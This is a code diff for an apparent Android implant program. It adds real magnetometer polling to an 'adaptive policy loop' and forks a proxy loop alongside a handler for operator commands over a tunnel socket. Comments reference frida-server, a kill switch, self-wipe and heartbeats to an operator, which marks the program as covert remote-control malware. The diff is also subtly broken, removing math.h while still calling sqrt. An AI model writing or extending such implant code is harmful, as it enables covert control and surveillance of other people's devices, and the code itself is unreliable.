@@ -12,35 +12,52 @@
 #include <signal.h>
 #include <fcntl.h>
 #include <time.h>
-#include <math.h>
+#include <android/sensor.h>
+#include <android/looper.h>
 
 #define FRIDA_SERVER_PATH "/data/local/tmp/frida-server"
 #define FRIDA_SERVER_PORT 27042
 #define TUNNEL_LISTEN_PORT 7080
 #define MAX_BUFFER 4096
 
-// Adaptive policy loop - magnetometer monitoring
+// Adaptive policy loop - magnetometer monitoring via ASensorManager
 void adaptive_policy_loop() {
     printf("Starting adaptive policy loop (magnetometer monitoring)...\n");
     
+    ASensorManager *sensor_manager = ASensorManager_getInstance();
+    const ASensor *magnetometer = ASensorManager_getDefaultSensor(sensor_manager, ASENSOR_TYPE_MAGNETIC_FIELD);
+    
+    if (magnetometer == NULL) {
+        printf("No magnetometer available, using simulated readings\n");
+    }
+    
+    ASensorEventQueue *queue = ASensorManager_createEventQueue(sensor_manager, ALooper_forThread(), 0, NULL, NULL);
+    if (magnetometer != NULL && queue != NULL) {
+        ASensorEventQueue_enableSensor(queue, magnetometer);
+        ASensorEventQueue_setEventRate(queue, magnetometer, 100000); // 10Hz
+    }
+    
     while (1) {
-        // In real implementation:
-        // 1. Poll ASensorManager for magnetometer readings (10Hz)
-        // 2. Compute field delta
-        // 3. Expose proximity status on local port 7080
-        // 4. Enforce max_transmits_per_hour, kill_switch, self_wipe_armed
-        // 5. Heartbeat to operator
-        
-        sleep(60); // Check every minute
-        
-        // Simulate magnetometer reading
-        double field = 45.0 + (rand() % 100) / 100.0; // microtesla
-        printf("Magnetometer reading: %.2f uT\n", field);
-        
-        // If field change exceeds threshold, adjust symbol rate or trigger kill
-        if (field > 50.0) {
-            printf("High magnetic field detected - adjusting transmission parameters\n");
+        if (magnetometer != NULL && queue != NULL) {
+            ASensorEvent event;
+            if (ASensorEventQueue_getEvents(queue, &event, 1) > 0) {
+                float x = event.magnetic.x;
+                float y = event.magnetic.y;
+                float z = event.magnetic.z;
+                float magnitude = sqrt(x*x + y*y + z*z);
+                
+                printf("Magnetometer reading: %.2f uT\n", magnitude);
+                
+                if (magnitude > 50.0) {
+                    printf("High magnetic field detected - adjusting transmission parameters\n");
+                }
+            }
+        } else {
+            // Fallback: no sensor available
+            printf("Magnetometer unavailable - running in degraded mode\n");
         }
+        
+        sleep(1); // Check every second
     }
 }
 
@@ -257,8 +274,21 @@ int main(int argc, char* argv[]) {
         exit(0);
     }
     
-    // 4. Main loop: handle commands from operator
+    // 4. Main loop: handle commands from operator + proxy data
+    // Start proxy loop in a separate process
+    pid_t proxy_pid = fork();
+    if (proxy_pid == 0) {
+        proxy_loop(tunnel_sock, TUNNEL_LISTEN_PORT);
+        exit(0);
+    }
+    
+    // Handle operator commands in main process
     handle_operator_commands(tunnel_sock);
+    
+    // Cleanup
+    if (proxy_pid > 0) {
+        kill(proxy_pid, SIGTERM);
+    }
     
     // Cleanup
     if (frida_pid > 0) {
